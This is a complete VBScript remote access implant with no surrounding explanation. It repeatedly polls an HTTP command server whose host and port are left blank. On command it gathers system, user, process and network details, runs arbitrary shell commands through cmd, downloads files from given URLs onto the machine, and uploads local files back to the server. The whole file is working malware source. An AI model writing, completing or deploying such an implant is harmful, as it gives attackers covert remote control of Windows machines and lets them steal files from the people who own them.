Option Explicit
On Error Resume Next
Dim shell: Set shell = CreateObject("WScript.Shell")
Dim fs: Set fs = CreateObject("Scripting.FileSystemObject")
Dim wmi: Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\CIMV2")
Dim http: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest")
If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP")
If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP")
Dim arrSplitUrl, strFilename, stream
Dim strHost, strPort, strUrl, strCD, intSleep
strHost = ""
strPort = ""
intSleep = 5000
strUrl = "http://" & strHost & ":" & strPort
strCD =  "."
Dim strInfo
While True
    http.Open "GET", strUrl & "/", False
    http.Send
    Dim strRawCommand
    strRawCommand = http.ResponseText
    Dim arrResponseText, strCommand, strArgument
    arrResponseText = Split(strRawCommand, " ", 2)
    strCommand = arrResponseText(0)
    strArgument = ""
    If UBound(arrResponseText) > 0 Then
        strArgument = arrResponseText(1)
    End If
    If strCommand = "PWD" Or strCommand = "GETWD" Then
        strCommand = "CD"
        strArgument = ""
    End If
    Select Case strCommand
        Case "NOOP"
            WScript.Sleep intSleep
        Case "SYSINFO"
            Dim objOS, strComputer, strOS, strBuild, strServicePack, strArchitecture, strLanguage
            For Each objOS in wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem")
               strComputer = objOS.CSName
               strOS = objOS.Caption
               strBuild = objOS.BuildNumber
               strServicePack = objOS.CSDVersion
               strArchitecture = objOS.OSArchitecture
               strLanguage = objOS.OSLanguage
               Exit For
            Next
            Dim strVersion
            strVersion = strOS & " (Build " & strBuild
            If strServicePack <> "" Then
                strVersion = strVersion & ", " & strServicePack
            End If
            strVersion = strVersion & ")"
            strInfo = "Computer: " & strComputer & vbCrLf & _
                      "OS: " & strVersion & vbCrLf & _
                      "Architecture: " & strArchitecture & vbCrLf & _
                      "System Language: " & strLanguage
            SendStatusUpdate strRawCommand, strInfo
        Case "GETUID"
            Dim strUserDomain, strUsername
            strUserDomain = shell.ExpandEnvironmentStrings("%USERDOMAIN%")
            strUsername = shell.ExpandEnvironmentStrings("%USERNAME%")
            strInfo = "Username: " & strUserDomain & "\" & strUserName
            SendStatusUpdate strRawCommand, strInfo
        Case "IFCONFIG"
            Dim arrNetworkAdapters: Set arrNetworkAdapters = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE MACAddress > ''")
            Dim objAdapter
            strInfo = ""
            For Each objAdapter In arrNetworkAdapters
                strInfo = strInfo & objAdapter.Description & vbCrLf
                If IsArray(objAdapter.IPAddress) Then
                    strInfo = strInfo & Join(objAdapter.IPAddress, vbCrLf) & vbCrLf & vbCrLf
                Else
                    strInfo = strInfo & "[Interface down]" & vbCrLf & vbCrLf
                End If
            Next
            strInfo = Mid(strInfo, 1, Len(strInfo)-4)
            SendStatusUpdate strRawCommand, strInfo
        Case "PS"
            Dim arrProcesses: Set arrProcesses = wmi.ExecQuery("SELECT * FROM Win32_Process")
            strInfo = PadRight("PID", 5) & "  " & PadRight("Name", 24) & "  " & "Session" & "  " & PadRight("User", 19) & "  " & "Path" & vbCrLf & _
                      PadRight("---", 5) & "  " & PadRight("----", 24) & "  " & "-------" & "  " & PadRight("----", 19) & "  " & "----" & vbCrLf
            Dim objProcess, strPID, strName, strSession, intHresult, strPDomain, strPUsername, strDomainUser, strPath
            For Each objProcess In arrProcesses
                strPID = objProcess.Handle
                strName = objProcess.Name
                strSession = objProcess.SessionId
                intHresult = objProcess.GetOwner(strPUsername, strPDomain)
                Select Case intHresult
                    Case 0
                        strDomainUser = strPDomain & "\" & strPUsername
                    Case 2
                        strDomainUser = "[Access Denied]"
                    Case 3
                        strDomainUser = "[Insufficient Privilege]"
                    Case 8
                        strDomainUser = "[Unknown Failure]"
                    Case Else
                        strDomainUser = "[Other]"
                End Select
                strPath = objProcess.ExecutablePath
                strInfo = strInfo & PadRight(strPid, 5) & "  " & PadRight(strName, 24) & "  " & PadRight(strSession, 7) & "  " & PadRight(strDomainUser, 19) & "  " & strPath & vbCrLf
            Next
            strInfo = Mid(strInfo, 1, Len(strInfo)-2)
            SendStatusUpdate strRawCommand, strInfo
        Case "SLEEP"
            If strArgument <> "" Then
                intSleep = CInt(strArgument)
                SendStatusUpdate strRawCommand, "Sleep set to " & strArgument & "ms"
            Else
                Dim strSleep
                strSleep = CStr(intSleep)
                SendStatusUpdate strRawCommand, "Sleep is currently set to " & strSleep & "ms"
                strSleep = Empty
            End If
        Case "SHELL"
            Dim strOutFile: strOutFile = fs.GetSpecialFolder(2) & "\rso.txt"
            shell.Run "cmd /C pushd """ & strCD & """ && " & strArgument & "> """ & strOutFile & """ 2>&1", 0, True
            Dim file: Set file = fs.OpenTextFile(strOutfile, 1)
            Dim text
            If Not file.AtEndOfStream Then
                text = file.ReadAll
            Else
                text = "[empty result]"
            End If
            file.Close
            fs.DeleteFile strOutFile, True
            SendStatusUpdate strRawCommand, text
            strOutFile = Empty
            text = Empty
        Case "CD"
            If Len(strArgument) > 0 Then
                Dim strNewCdPath
                strNewCdPath = GetAbsolutePath(strArgument)
                If fs.FolderExists(strNewCdPath) Then
                    strCD = strNewCdPath
                End If
            End If
            SendStatusUpdate strRawCommand, strCD
        Case "WGET"
            arrSplitUrl = Split(strArgument, "/")
            strFilename = arrSplitUrl(UBound(arrSplitUrl))
            strFilename = GetAbsolutePath(strFilename)
            Err.Clear() ' Set error number to 0
            http.Open "GET", strArgument, False
            http.Send
            If Err.number <> 0 Then
                SendStatusUpdate strRawCommand, "Error when downloading from " & strArgument & ": " & Err.Description
            Else
                Set stream = createobject("Adodb.Stream")
                With stream
                    .Type = 1 'adTypeBinary
                    .Open
                    .Write http.ResponseBody
                    .SaveToFile strFilename, 2 'adSaveCreateOverWrite
                End With
                SendStatusUpdate strRawCommand, "File download from " & strArgument & " successful."
            End If
            arrSplitUrl = Array()
            strFilename = Empty
        Case "DOWNLOAD"
            Dim strFullSourceFilePath
            strFullSourceFilePath = GetAbsolutePath(strArgument)
            If fs.FileExists(strFullSourceFilePath) Then
                arrSplitUrl = Split(strFullSourceFilePath, "\")
                strFilename = arrSplitUrl(UBound(arrSplitUrl))
                Set stream = CreateObject("Adodb.Stream")
                stream.Type = 1 ' adTypeBinary
                stream.Open
                stream.LoadFromFile strFullSourceFilePath
                Dim binFileContents
                binFileContents = stream.Read
                DoHttpBinaryPost "upload", strRawCommand, strFilename, binFileContents
                binFileContents = Empty
            Else
                SendStatusUpdate strRawCommand, "File does not exist: " & strFullSourceFilePath
            End If
            arrSplitUrl = Array()
            strFilename = Empty
            strFullSourceFilePath = Empty
        Case "KILL"
            SendStatusUpdate strRawCommand, "Goodbye!"
            WScript.Quit 0
        Case Else
            SendStatusUpdate strRawCommand, "Unknown command"
    End Select
    strRawCommand = Empty
    arrResponseText = Array()
    strCommand = Empty
    strArgument = Empty
    strInfo = Empty
Wend
Function PadRight(strInput, intLength)
    Dim strOutput
    strOutput = LEFT(strInput & Space(intLength), intLength)
    strOutput = LEFT(strOutput & String(intLength, " "), intLength)
    PadRight = strOutput
End Function
Function GetAbsolutePath(strPath)
    Dim strOutputPath
    strOutputPath = ""
    strPath = Replace(strPath, "/", "\")
    If Left(strPath, 1) = "\" Or InStr(1, strPath, ":") <> 0 Then
        strOutputPath = strPath
    Else
        strOutputPath = strCD & "\" & strPath
    End If
    GetAbsolutePath = fs.GetAbsolutePathName(strOutputPath)
End Function
Function SendStatusUpdate(strText, strData)
    Dim binData
    binData = StringToBinary(strData)
    DoHttpBinaryPost "cmd", strText, "cmdoutput", binData
End Function
Function DoHttpBinaryPost(strActionType, strText, strFilename, binData)
    Const strBoundary = "----WebKitFormBoundaryNiV6OvjHXJPrEdnb"
    Dim binTextHeader, binText, binDataHeader, binFooter, binConcatenated
    binTextHeader = StringToBinary("--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""cmd""" & vbCrLf & vbCrLf)
    binDataHeader = StringToBinary(vbCrLf & _
                                   "--" & strBoundary & vbCrLf & _
                                   "Content-Disposition: form-data; name=""result""; filename=""" & strFilename & """" & vbCrLf & _

                                   "Content-Type: application/octet-stream" & vbCrLf & vbCrLf)

    binFooter = StringToBinary(vbCrLf & "--" & strBoundary & "--" & vbCrLf)
    binText = StringToBinary(strText)
    Dim stream : Set stream = CreateObject("Adodb.Stream")
    stream.Open
    stream.Type = 1 ' adTypeBinary
    stream.Write binTextHeader
    stream.Write binText
    stream.Write binDataHeader
    stream.Write binData
    stream.Write binFooter
    stream.Position = 0
    binConcatenated = stream.Read(stream.Size)
    http.Open "POST", strUrl & "/" & strActionType, False
    http.SetRequestHeader "Content-Length", LenB(binConcatenated)
    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & strBoundary
    http.SetTimeouts 5000, 60000, 60000, 60000
    http.Send binConcatenated
    DoHttpBinaryPost = http.ResponseText
End Function
Function StringToBinary(Text)
    Dim stream: Set stream = CreateObject("Adodb.Stream")
    stream.Type = 2 'adTypeText
    stream.CharSet = "us-ascii"
    stream.Open
    stream.WriteText Text
    stream.Position = 0
    stream.Type = 1 'adTypeBinary
    StringToBinary = stream.Read
End Function
